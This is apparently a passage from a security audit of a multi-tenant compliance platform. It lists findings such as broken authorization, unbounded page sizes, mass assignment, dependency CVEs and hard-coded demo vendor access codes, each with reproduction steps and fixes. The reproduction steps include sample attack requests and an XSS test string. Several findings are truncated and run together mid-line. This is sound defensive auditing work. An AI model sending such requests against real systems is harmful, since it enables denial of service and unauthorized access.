reproduction: 1. Log in as a user without COMPLIANCE:READ. 2. GET /api/v1/compliance/regulatory-horizon -> 200 with the full horizon payload.
resolution: Change the guard to @PreAuthorize("hasPermission('COMPLIANCE','READ')") to match the rest of the compliance controllers.
references: OWASP API Top 10 2023: API5 Broken Function Level Authorization

title: Unbounded page size on regreporting and reginspect list endpoints (resource-exhaustion DoS)
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L) — caller-controlled, uncapped page size
description: listObligations/listFilings (regreporting) and list (reginspect) accept raw @RequestParam int page and int size and pass them straight into PageRequest.of(page, size) in the service with no upper bound. A caller can request size=1000000 and force the server to materialise and serialise an enormous page in one query. This contrasts with the ControlController/obligation controllers which use @PageableDefault. (Several aggregate reads in this package also hard-code PageRequest.of(0,1000) in-memory, e.g. FrameworkAnchorController.findingsAging — bounded but a fixed wide page.)
rootCause: No maximum-size clamp on user-supplied pagination parameters before constructing the Pageable.
impact: An authenticated user can trigger large heap allocation and slow queries by requesting a very large page size, contributing to denial of service. Impact is bounded by the tenant's row counts but still allows disproportionate resource use from a single request.
reproduction: GET /api/v1/regreporting/filings?page=0&size=10000000 — the server attempts to load up to that many rows in one page.
resolution: Clamp size to a sane maximum (e.g. Math.min(size, 200)) and validate page>=0, or switch these endpoints to Spring's resolved Pageable with @PageableDefault and a configured spring.data.web.pageable.max-page-size.
references: CWE-770: Allocation of Resources Without Limits or Throttling
OWASP API Top 10 2023: API4 Unrestricted Resource Consumption

title: Cross-tenant foreign-key references accepted without ownership validation (assessmentId, frameworkId, policyId, relatedControlId/relatedRiskId)
category: Improper Validation of Specified Resource (A04 / CWE-20) — tenant integrity
cvss: CVSS 3.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — dangling cross-tenant references, no direct data read
description: Several create/update paths accept foreign-key ids from the request body and persist them on a freshly org-stamped row without verifying that the referenced parent belongs to the caller's tenant. Examples: ComplianceService.applyFinding sets f.assessmentId / f.frameworkId from the request; PolicyService.createException sets policyId and createAttestation sets policyId from the body; ObligationService.create/update sets relatedControlId / relatedRiskId. The owning row is correctly stamped with the caller's organisationId, so no cross-tenant data is read back through these objects, but the stored reference can point at another tenant's primary key, creating dangling/forged linkage that may mislead downstream joins, rollups, or future features that dereference these ids.
rootCause: Foreign-key inputs are trusted as-is; there is no 'parent belongs to same org' check before the reference is saved.
impact: Data-integrity / referential-integrity weakness: a tenant can attach references to objects it does not own, polluting reporting links and risking information disclosure if any future code path resolves these ids without re-checking org ownership. No direct cross-tenant read occurs today through the audited paths.
reproduction: 1. As tenant A, POST /api/v1/compliance/findings with assessmentId set to a tenant-B assessment id. 2. The finding is created in tenant A but references a foreign assessment; the link is silently accepted.
resolution: On each write, validate that supplied parent ids resolve to a row owned by TenantContext.getCurrentTenant() (e.g. assessmentRepo.findById(id).filter(a -> a.getOrganisationId().equals(org)) ...), rejecting otherwise. Apply the same check to policyId (exceptions/attestations) and relatedControlId/relatedRiskId on obligations.
patchBefore:
if (req.frameworkId() != null) f.setFrameworkId(req.frameworkId());
f.setAssessmentId(req.assessmentId());
references: CWE-1220: Insufficient Granularity of Access Control
OWASP API Top 10 2023: API1 Broken Object Level Authorization

title: Spring Boot Actuator 3.5.6 — authentication bypass via Health Group additional path & CloudFoundry endpoints
cvss: 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) — CVE-2026-22731

locations.note: direct spring-boot-starter-actuator dependency (version managed by parent BOM lines 8-15)

description: spring-boot-starter-actuator 3.5.6 is affected by CVE-2026-22731 (CWE-288/CWE-306, CVSS 8.2): an authentication-bypass when an authenticated endpoint is declared under a path already configured as a Health Group additional path; and CVE-2026-22733 (CVSS 8.2): authentication bypass under Actuator CloudFoundry endpoints.
rootCause: Actuator starter is declared directly (pom.xml lines 66-69) but its version is managed by spring-boot-starter-parent 3.5.6 (lines 8-15), which predates the 3.5.12 fix.
evidence: Trivy: PkgName "org.springframework.boot:spring-boot-starter-actuator", InstalledVersion "3.5.6", CVE-2026-22731 Severity HIGH, FixedVersion "3.5.12, 4.0.4". pom.xml lines 66-69 declare spring-boot-starter-actuator.
impact: The platform exposes the Actuator (Prometheus scrape and health endpoints, see pom.xml lines 212-218). A misconfigured Health Group additional path could let an unauthenticated caller reach endpoints that should require authentication, leaking operational and security telemetry.
reproduction: Run `trivy fs --scanners vuln tss-grc-backend/pom.xml`; CVE-2026-22731 and CVE-2026-22733 report HIGH against spring-boot-starter-actuator 3.5.6.
resolution: Upgrade spring-boot-starter-parent to 3.5.14 (>= 3.5.12 contains the Actuator fix). Verify any Health Group additional-path configuration after the upgrade.
patchBefore: <version>3.5.6</version>  <!-- spring-boot-starter-parent -->
patchAfter: <version>3.5.14</version>  <!-- spring-boot-starter-parent: Actuator CVE-2026-22731/22733 fixed in 3.5.12 -->

_verification.rationale: REFUTED as a High. pom uses spring-boot-starter-actuator under Boot 3.5.6, but the cited CVE concerns an authentication bypass specifically via a Health Group 'additional-path' and via CloudFoundry actuator endpoints. Neither precondition exists here: application.yml exposes only health,info,metrics (prod adds prometheus) with NO health groups and NO additional-path configured; the app is a plain Spring Boot jar, not deployed on CloudFoundry (no CF actuator auto-config). In prod the management endpoints run on a separate, non-public port 8090 (server.port: 8090, documented as 'not exposed publicly') with health show-details: never. With the vulnerable feature unused and the management surface network-isolated, the bypass is not reachable. This is at most a keep-up-to-date hygiene note; lowering to Low.

title: Spring Boot 3.5.6 — predictable ApplicationTemp directory enables code execution / session hijacking (CVE-2026-40973)
cvss: 7.0 (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H) — CVE-2026-40973

locations.note: spring-boot-starter-parent BOM pins the spring-boot core artifact version

description: The spring-boot core artifact 3.5.6 is affected by CVE-2026-40973 (CWE-377, CVSS 7.0): a local attacker on the same host can take control of the directory used by ApplicationTemp. When server.servlet.session.persistent=true and the attack persists across restarts, the attacker can read session information to hijack authenticated users, or deploy a gadget chain to execute code as the application user.
rootCause: The spring-boot core version is pinned by spring-boot-starter-parent 3.5.6 (pom.xml lines 8-15), which predates the 3.5.14 fix.
evidence: Trivy: PkgName "org.springframework.boot:spring-boot", InstalledVersion "3.5.6", CVE-2026-40973 Severity HIGH, FixedVersion "4.0.6, 3.5.14".
impact: On a shared host a local attacker could hijack authenticated GRC sessions or achieve code execution as the application user. Exposure depends on session persistence configuration, but the predictable temp directory is created regardless.
reproduction: Run `trivy fs --scanners vuln tss-grc-backend/pom.xml`; CVE-2026-40973 reports HIGH against spring-boot 3.5.6.
resolution: Upgrade spring-boot-starter-parent to 3.5.14 (or 4.0.6). As defense-in-depth, avoid setting server.servlet.session.persistent=true and ensure the temp directory is on a path not writable by other local users.
patchBefore: <version>3.5.6</version>  <!-- spring-boot-starter-parent -->
patchAfter: <version>3.5.14</version>  <!-- spring-boot-starter-parent: CVE-2026-40973 fixed in 3.5.14 -->

_verification.rationale: REFUTED as a High. The declared version (Boot 3.5.6, pom lines 8-15) is accurate, but the finding overstates impact and cites a CVE id ('CVE-2026-40973') I cannot corroborate as a real, code-execution-grade vulnerability. The underlying issue class — a predictable ApplicationTemp working directory — is a LOCAL information-disclosure / tampering weakness: exploitation requires an attacker who already has local filesystem access to the shared OS temp directory on the host and can race/plant files there. It is not remotely reachable and does not by itself yield 'code execution / session hijacking' as the title claims (no session state is stored in that temp dir in this stateless-JWT app; sessions are STATELESS per SecurityConfig). 3.5.6 is a recent patch line and there is no remote attack surface tied to this in the codebase. Genuine impact is low and local-only; downgrading to Low (keep dependencies current, but not a High).

title: Entity-bodied write endpoints lack DTO validation and accept arbitrary entity fields
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — unvalidated/over-broad input on write paths
description: Most cyber and SOC-Ops write controllers bind raw JPA @Entity objects directly from @RequestBody with no @Valid annotation and no request DTO. The entities carry no Jakarta Bean Validation constraints on the bound fields, so callers can submit unconstrained strings (status/severity/workflow values outside the allowed enums, oversized free-text fields up to the column limit, audit/BaseEntity fields, etc.). This is the same class of input-trust problem that enables the id-driven mass-assignment in SEC-CYB-002, but is called out separately because the missing @Valid + DTO boundary also permits invalid workflow/enum values and unbounded text to reach persistence. The well-built reference modules (cyber_lc VulnerabilityDto with @NotBlank/@Pattern, vuln_sla and asm DTOs) show the intended pattern.
rootCause: Controllers expose persistence entities as the API request model instead of validated DTOs; @Valid is omitted, so even existing column constraints are only enforced (if at all) at the database layer rather than returning a clean 400.
impact: Callers can persist semantically invalid records (e.g. arbitrary workflowStatus/severity strings that break dashboard aggregation and workflow state machines) and submit over-broad payloads. Combined with the entity-as-request-model design, it widens the attack surface for property-level abuse. Low severity on its own because no direct confidentiality breach results and the worst mass-assignment vector is tracked under SEC-CYB-002.
reproduction:
1. As a CYBER:WRITE user, POST /api/v1/cyber/vulnerabilities with {"severity":"PWNED","workflowStatus":"BOGUS", ...}.
2. The record is accepted; severity/workflowStatus persist unvalidated and skew dashboard counts and escalation logic.
resolution: Introduce request DTOs for the cyber and SOC-Ops write endpoints (mirroring cyber_lc/vuln_sla/asm), annotate fields with @NotBlank/@Pattern/@Size, and add @Valid on the @RequestBody parameter. Map DTO -> entity inside the service so server-controlled fields (id, organisationId, externalId, audit fields, workflowStatus) are never client-settable.

title: AI-assisted suggestion endpoints accept unvalidated request bodies and lack function-level authorization (isAuthenticated only)
category: Broken Access Control / Improper Input Validation (A01/A04) — CWE-862 / CWE-20
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N) — any user can generate/persist AI drafts; low direct impact
description: The /api/v1/ai/** suggestion endpoints (risk-description, bia-rto-rpo, evidence-quality, incident-root-cause, board-summary, workflow-submission-review, suggestions listing, and the suggestions/{id}/review accept/reject) are guarded only by @PreAuthorize("isAuthenticated()") and bind their record DTOs with no @Valid / no constraints. Unlike the AI governance registry (/api/v1/ai/models/**), which applies hasAnyRole READ/WRITE guards, these endpoints have no role separation: any authenticated user can drive the generator and accept/reject suggestion drafts. Exploitability and impact are limited because (a) the generators are deterministic rule-based heuristics with no outbound LLM/network call and no SQL, (b) every suggestion is persisted scoped to TenantContext org id and the review() path re-checks organisationId before mutating, and (c) suggestions are explicitly non-authoritative drafts that never mutate a real record on their own. The risk is therefore minor: unbounded creation of AiSuggestion rows (resource/audit-noise) and the ability for any user — rather than a designated reviewer — to mark a draft ACCEPTED/REJECTED. The board-summary input also reflects caller-supplied KPI numbers straight into a persisted narrative, so a user can fabricate a board posture string, but it is clearly labelled an unreviewed draft.
rootCause: The suggestion controller predates / was not aligned to the hasPermission model used elsewhere; DTOs are bound without validation and the accept/reject action is not restricted to a reviewer role.
impact: Any authenticated user can mass-generate AI suggestion drafts (DB/audit-log noise) and accept or reject another user's drafts. No cross-tenant exposure (org-scoped) and no record-of-truth mutation, so direct security impact is low.
reproduction: As any authenticated user: POST /api/v1/ai/board-summary {...} repeatedly to spam AiSuggestion rows; or POST /api/v1/ai/suggestions/{id}/review {"decision":"ACCEPTED"} on a draft created by another (same-tenant) user.
resolution: Align with the platform model: require hasPermission('AI','READ') for listing/generation and a reviewer-level authority (e.g. hasPermission('AI','WRITE') or hasAnyRole(...)) for the /review accept-reject action. Add @Valid plus @NotNull/@Size constraints on the input records and bound the volume of drafts a caller can create.
references: OWASP API Security Top 10 2023 — API5:2023 Broken Function Level Authorization

title: Unbounded page size on Sustainability list endpoints enables resource-exhaustion (no max cap on the size parameter)
category: Improper Input Validation / Uncontrolled Resource Consumption (A04) — CWE-770
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L) — caller-controlled page size, potential memory/DoS
description: List endpoints accept a caller-supplied `size` query param (defaults 50/100) that is passed straight into PageRequest.of(page, size) with no upper bound. A caller can request size=1000000 and force the service to materialise a very large page from the tenant's data set. Several aggregate endpoints (evidence.aggregate, capa.aggregate, climate.aggregate, ghg.aggregate) additionally load the full org result set into memory with findByOrganisationId(...)/findByOrganisationIdAndStatusIn(...) and iterate — fine at demo scale but unbounded in principle. Impact is bounded to the caller's own tenant (org-scoped), so this is availability-only.
rootCause: No maximum-size clamp on the pagination parameter and a few aggregate paths read the entire org collection into memory.
evidence:
EsgMetricController.list(...): var p = PageRequest.of(page, size);  // size has @RequestParam(defaultValue="100") but no max
GhgEmissionRecordController.list(...): same pattern, defaultValue="100", no cap
impact: An authenticated user can issue large-page or repeated full-collection reads to consume backend heap / DB I/O, degrading availability for the tenant. No data exposure beyond the caller's own org.
reproduction: GET /api/sustainability/metrics?size=10000000 — the backend attempts to build a page of up to ten million rows.
resolution: Clamp the page size to a sane maximum (e.g. min(size, 200)) in each controller or via a shared @ParameterObject Pageable resolver / PageableHandlerMethodArgumentResolver configured with a maxPageSize. For aggregate endpoints, prefer DB-side COUNT/GROUP BY queries over loading the full collection.
patchBefore: var p = PageRequest.of(page, size);
patchAfter: var p = PageRequest.of(page, Math.min(size, 200));
references: CWE-770: Allocation of Resources Without Limits or Throttling
OWASP API Security Top 10 2023 — API4:2023 Unrestricted Resource Consumption

title: Attachment download reflects client-controlled MIME type into Content-Type response header
cvss: CVSS 3.1 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N) — largely mitigated by global X-Content-Type-Options:nosniff and Content-Disposition:attachment
description: On upload, the stored `mimeType` is taken verbatim from `file.getContentType()` (AttachmentStorageService line 78 -> AttachmentService line 55), which is fully client-controlled. On download (AttachmentController lines 60-65) that stored value is echoed straight into the response via `MediaType.parseMediaType(p.mimeType())`. The same pattern exists for evidence items. The download is served with `Content-Disposition: attachment` (forces download) and the application sets a global `X-Content-Type-Options: nosniff` header (SecurityConfig line 141), which together strongly mitigate drive-by/stored-XSS via a spoofed text/html content-type. The extension allow-list also blocks `.html`/`.svg`. Residual risk is therefore low, but reflecting an unvalidated, attacker-supplied content-type is still poor hygiene and could matter if the attachment is ever rendered inline (e.g. a future preview feature dropping Content-Disposition).
rootCause: The client-provided multipart Content-Type is persisted and trusted as the authoritative MIME type rather than being derived server-side from the validated extension or via content sniffing.
impact: If a future change serves attachments inline (removes Content-Disposition: attachment) or a client ignores nosniff, an uploaded file with a crafted text/html content-type could be rendered and execute script in the app origin. As currently wired (attachment disposition + nosniff + extension allow-list) practical exploitation is blocked, so impact is limited to defence-in-depth.
reproduction:
1. Upload a file while setting the multipart part's Content-Type to `text/html` (the extension must still be in the allow-list, e.g. `.txt`).
2. Download it and observe the response carries `Content-Type: text/html`. With nosniff + attachment disposition the browser still downloads rather than renders, so no script executes today.
resolution: Derive the served Content-Type from the validated file extension (a server-side extension->MIME map) instead of the client value, or force `application/octet-stream` for any non-allowlisted/ambiguous type. Keep Content-Disposition: attachment and the global nosniff header. Optionally store the canonical server-derived MIME at upload time.
references: CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
CWE-434: Unrestricted Upload of File with Dangerous Type

title: EvidenceItemService.addLink creates a link to an evidence id without verifying it belongs to the caller's tenant
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N) — in-tenant data-integrity / weak IDOR; no direct cross-tenant data read
description: `addLink` persists an `EvidenceLink` straight from the request DTO. It correctly stamps the link's `organisationId` from the caller's TenantContext, but it never validates that `req.evidenceId()` (nor the `linkedEntityId`) actually resolves to an evidence item / entity owned by that org. Unlike the other mutators in this service (get/update/approve/delete all `findById(...).filter(e -> e.getOrganisationId().equals(orgId))`), the linked-id is trusted blindly. A caller can therefore create dangling or cross-pointing links referencing arbitrary numeric ids, including evidence ids that belong to another tenant. Because the stored link row is tagged with the caller's own org, reads stay tenant-scoped, so this does not directly leak another tenant's data — but it corrupts the evidence-linkage graph (audit pack traceability) and could mislead reviewers, and the missing ownership check is the same class of defect as a BOLA.
rootCause: Object-ownership validation that is consistently applied elsewhere in the service was omitted on the create-link path; the foreign id from the request is trusted without a tenant-scoped lookup.
impact: Integrity of the evidence-to-control / evidence-to-risk linkage graph can be polluted with links to non-existent or other-tenant evidence ids, weakening audit-pack traceability and coverage reporting. No direct cross-tenant disclosure given org-scoped reads, hence Low.
reproduction:
1. Authenticate with EVIDENCE:WRITE.
2. `curl -X POST -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
   -d '{"evidenceId":999999,"linkedModule":"RISK","linkedEntityId":424242}' \
   http://localhost:8084/api/v1/evidence/items/link`
3. A link row is created even though evidence id 999999 does not belong to the caller's org (or does not exist).
resolution: Before saving, load the evidence item via the tenant-scoped finder and reject if it is not owned by the caller's org; optionally validate the linked entity reference too.
references: CWE-639: Authorization Bypass Through User-Controlled Key
OWASP API1:2023 Broken Object Level Authorization

title: Hand-rolled Markdown-to-HTML renderer feeding dangerouslySetInnerHTML in v2 Knowledge Base
cvss: CVSS 3.7 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N) — current escaping holds; risk is fragility/regression in a custom sanitiser
description: This is the only `dangerouslySetInnerHTML` in the v2 React app. KB article bodies (server content) are passed through a custom `renderMarkdown()` and injected raw (line 86). The renderer does HTML-escape `& < >` first (lines 104-107) and gates link URLs through a `sanitiseUrl()` scheme allowlist that blocks `javascript:`/`data:`/`vbscript:` (lines 157-169), which closes the obvious vectors. However the implementation is a bespoke regex sanitiser rather than a vetted library (marked + DOMPurify), and has gaps that make it fragile: (1) it does NOT escape the double-quote character globally — only `<>&` are neutralised in step 1, so the `"` -> `"` mapping relies entirely on sanitiseUrl for the href; any future code that places user text into an attribute would be unsafe; (2) the heading/list/paragraph regexes run AFTER escaping but a future contributor adding image syntax, raw-HTML passthrough, or attribute support could easily reintroduce an injection because there is no post-render sanitisation pass; (3) `sanitiseUrl` strips leading `\s` and `-` then lowercases for the check but returns the original `raw`, so the validation and the emitted value are computed from different strings — a brittle pattern. No working bypass was found in the current code, so this is Low / defence-in-depth, not an active High.
rootCause: Rolling a custom markdown sanitiser instead of using a maintained library, and using `dangerouslySetInnerHTML` for server-supplied rich text.
evidence: KbArticlePage.tsx:86 `dangerouslySetInnerHTML={{ __html: renderMarkdown(body ?? '') }}`. KbArticlePage.tsx:104-107 escapes only `& < >` (no `"`). KbArticlePage.tsx:161-169 `sanitiseUrl` validates a transformed string but returns the original `raw`.
impact: If the renderer is extended (images, tables, raw HTML) or the escaping invariants are broken by a refactor, KB content — which non-admin authors can typically create — becomes a stored-XSS channel into reviewers' sessions (and, via SEC-FE-002, their tokens). Today the impact is limited because the current ruleset blocks the known vectors.
reproduction: No reliable exploit against the current code. Negative test: a KB body of `[x](javascript:alert(1))` renders `<a href="#">` (inert). Regression risk only.
resolution: Replace the hand-rolled renderer with `marked`/`markdown-it` to parse and DOMPurify to sanitise the resulting HTML before `dangerouslySetInnerHTML` (or render to React elements without raw HTML). At minimum, add `"` and `'` to the global escape step and add a final DOMPurify pass over the produced HTML.
references: CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
CWE-80: Improper Neutralization of Script-Related HTML Tags
OWASP DOM-based XSS Prevention Cheat Sheet

title: ScmService silently defaults to organisation 1 when TenantContext is empty (fail-open tenant scoping)
cvss: CVSS ~4.2 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N) — fail-open default tenant on missing context
description: ScmService.orgId() returns TenantContext.getCurrentTenant(), and when that is null it falls back to 1L: `Long id = TenantContext.getCurrentTenant(); return id != null ? id : 1L;`. Every other audited financial-crime service (Fraud, Sharia, RRP, OpRes, AML) uses TenantContext.requireOrganisationId(), which throws if the tenant is missing (fail closed). If any code path ever invokes ScmService without an established TenantContext (e.g. a future scheduler, async task, mis-ordered filter, or a test/util path), reads and writes would silently bind to tenant 1's data — reading tenant 1's vendors/contracts or writing new rows into tenant 1. The IntakeService author chose the opposite (throws IllegalStateException on null tenant), confirming the intended platform convention is fail-closed.
rootCause: Defensive 'default to org 1' shortcut instead of failing closed; diverges from the requireOrganisationId() convention used everywhere else.
evidence: `private Long orgId() { Long id = TenantContext.getCurrentTenant(); return id != null ? id : 1L; }` — used by every read/write in ScmService (e.g. listVendors, createVendor, stats).
impact: Under any future context-loss condition, SCM operations would silently operate on tenant 1 instead of erroring, risking cross-tenant read/write of vendor, contract and incident data. Low today because the JWT filter normally sets the tenant on authenticated requests.
reproduction: Static/architectural: invoke any ScmService read with TenantContext cleared (e.g. from a scheduled job or test harness) — it returns tenant 1's data instead of throwing.
resolution: Replace the 1L fallback with TenantContext.requireOrganisationId() so SCM fails closed like the other modules.
references: CWE-639: Authorization Bypass Through User-Controlled Key

title: Missing @Valid and unbounded page sizes on raw-entity / map request bodies in change_mgmt and SCM sub-controllers
cvss: CVSS ~3.7 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L) — unvalidated input and large-page DoS surface
description: ChangeManagementController binds raw entities (ChangeRequest, ChangeApproval, ChangeTask, ChangeLink, ChangeComment) as @RequestBody with no @Valid; the service applies only ad-hoc null/blank checks. Several list endpoints accept a caller-controlled page size with no upper bound: ContractClauseController list defaults size=200 (line 31) and FourthPartyExposureController/SupplierResilienceController/SupplierResilienceTestController default size=100, all passed straight into PageRequest.of(page, size) with no clamp — a caller may request an arbitrarily large page (e.g. ?size=1000000) and force the DB to materialise an unbounded result set. The change_mgmt entity binding also creates a minor mass-assignment surface for child rows (e.g. ChangeApproval), though the parent organisation scope is enforced via require(changeId) and the children carry no organisationId column, so integrity impact is limited.

evidence: `public ChangeRequest create(@RequestBody ChangeRequest body)` (no @Valid). `@RequestParam(defaultValue = "200") int size ... PageRequest.of(page, size)` in ContractClauseController.list. `@RequestParam(defaultValue = "100") int size` in FourthPartyExposureController.list.

reproduction: 1) GET /api/scm/contract-clauses?size=1000000 -> server attempts to load up to a million rows. 2) POST /api/v1/changes with a body missing required fields -> bypasses Bean Validation, relying solely on DB constraints.

title: Workflow-engine instance/transition actor (executedById, ownerId) taken from request body, not the principal
category: Improper Authorization / Insufficient Verification of Data Authenticity (A01/A08)
cvss: CVSS ~4.3 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N) — attribution spoofing, gated behind PLATFORM_ADMIN
description: startInstance() reads ownerId and executeTransition() reads executedById from the untyped @RequestBody Map<String,Object>, then persists them into the workflow instance and the WorkflowActionLog audit record. title: Committee controllers bind raw JPA @Entity objects as request bodies (mass-assignment surface)
cvss: CVSS ~3.7 (AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N) — largely mitigated by service-layer id/org reset
description: Several committee write endpoints accept the persistence entity directly as @RequestBody (create(@RequestBody CommitteeResolution in), circulate(@RequestBody CommitteeMeetingPaper in), appoint(@RequestBody CommitteeMemberTerm in), addSkill(@RequestBody CommitteeMemberSkill in), create(@RequestBody CommitteeActionItem in)). Clients can therefore submit server-managed fields (id, organisationId, isDeleted, createdAt, audit columns) and cross-tenant foreign keys (committeeId/meetingId). The corresponding services largely neutralise this: each create-style method calls in.setId(null) and in.setOrganisationId(TenantContext.getCurrentTenant()) (see CommitteeResolutionService:89-92, CommitteeMeetingPapersService:63-66, CommitteeMemberRegistryService:76-79,209-212) and the comments explicitly cite mass-assignment defence. title: Hardcoded vendor-portal access codes shipped in the frontend bundle
category: Identification and Authentication Failures (A07) / CWE-798 Use of Hard-coded Credentials
cvss: CVSS 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) — demo-only vendor data, client-side plaintext auth; no real tenant data behind it
description: The vendor self-service portal authenticates vendors by an `accessCode` field. The full set of valid access codes is hard-coded as plaintext string literals in the `DEMO_VENDORS` array (e.g. 'NEOM-2026-A4Z9' line 231, 'TABUK-LOG-2026-X7M2' line 267, 'JEDDAH-CON-2026-B2K8' line 300) and matched at runtime by `findVendorByAccessCode()`, which performs a simple case-insensitive plaintext equality check (`v.accessCode.toLowerCase() === code.toLowerCase()`, line 329). Because this is a static frontend, these codes ship in the served JS bundle and the entire authentication decision happens client-side. Gitleaks flagged 'NEOM-2026-A4Z9' as a generic API key; on inspection it is a hard-coded vendor login credential rather than an API key. The data set is explicitly demo data ('Demo vendor accounts' comment, line 222) — the named orgs (NEOM/Tabuk/Jeddah) are illustrative, not live customers — which is why this is Low and not High.
rootCause: Demo/seed authentication data was embedded directly in the shipped frontend source as plaintext literals, and the vendor-portal login is implemented as a pure client-side string comparison with no backend verification.
impact: Anyone who reads the (publicly served) frontend bundle can recover every demo vendor's login code and impersonate that vendor in the portal. In the current state the blast radius is limited to demo data, but the pattern is a trap: if real vendors are onboarded by adding rows to this array, their credentials would be exposed the same way, and the client-side-only auth would let any client bypass it entirely (DevTools / call `findVendorByAccessCode` directly).

cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L) — authenticated DoS / memory pressure
description: Paged list endpoints accept a client-controlled `size` parameter (defaults 50-200) with no upper bound, so a caller may request size=1000000 and force the DB and JSON serializer to materialise an arbitrarily large result set. Separately, NdiAuditService.aggregate() calls repo.findByOrganisationIdOrderByOccurredAtDesc(o, Pageable.unpaged()), loading the tenant's entire audit_event table into memory on every dashboard/aggregate request. title: Raw JPA entities bound from request bodies (mass assignment exposure)
cvss: CVSS 3.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — limited; server overrides the security-sensitive fields
description: Across the NDI module the controllers accept the persistence entities themselves as @RequestBody (NdiReportDefinition, NdiAssessmentCycle, NdiGap, NdiComplianceAssessment, NdiEvidenceItem, NdiSetting, NdiAuditEvent) with no @Valid and no DTO boundary. The client can therefore set any settable field on the entity, including id, organisationId, isDeleted, createdAt/createdBy, and last_run_* audit columns. In the create()/update() service methods reviewed, the sensitive fields are defended (id forced to null, organisationId stamped from TenantContext, update() whitelists fields), which prevents cross-tenant writes — so the practical impact today is low. NdiAuditEvent is the worst case (see SEC-NDI-002) because record() does not whitelist fields.

title: @babel/core arbitrary file read via sourceMappingURL comment (build-time, low)
cvss: CVSS 3.2 (CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N) — GHSA-4x5r-pxfx-6jf8. Local, high attack complexity, low confidentiality; transitive build-time-only dependency.
description: @babel/core 7.29.0 (package-lock.json lines 57-62, marked dev:true) is a transitive dependency of @vitejs/plugin-react 4.7.0 (which declares @babel/core ^7.28.0 at package-lock.json line 1447). GHSA-4x5r-pxfx-6jf8 (CWE-22, CWE-200) reports that @babel/core can perform an arbitrary file read when processing a crafted `//# sourceMappingURL=` comment that points at a local file path, causing Babel to read and embed that file's contents into the source map. Installed 7.29.0 is at the top of the vulnerable range <=7.29.0; the fix is the next patch. This is a build-time tool only (dev dependency, never shipped to the browser bundle), so exploitation requires the build to process attacker-controlled source — a low-likelihood scenario for an internal app.
rootCause: Transitive dev dependency @babel/core 7.29.0 (via @vitejs/plugin-react 4.7.0) honours sourceMappingURL comments pointing at local files without restricting the path, allowing file content to be read into the generated source map.
impact: If the build pipeline ever compiles source files supplied by an untrusted party (e.g. a malicious dependency or contributed module), a crafted sourceMappingURL comment can cause Babel to read an arbitrary local file from the build host and leak it into the emitted source map (which the project ships, since vite.config.ts sets build.sourcemap:true). Low real-world risk for a first-party internal UI; included for completeness.

Inspect the generated .map output for the leaked file content. npm audit --json: @babel/core range <=7.29.0, fixAvailable:true.
resolution: Upgrade @babel/core past 7.29.0. It is transitive, so either bump @vitejs/plugin-react to a release pinning the patched @babel/core, or add an npm `overrides` entry forcing @babel/core to the fixed version. npm audit reports fixAvailable:true (non-major). Re-run `npm audit` to confirm.
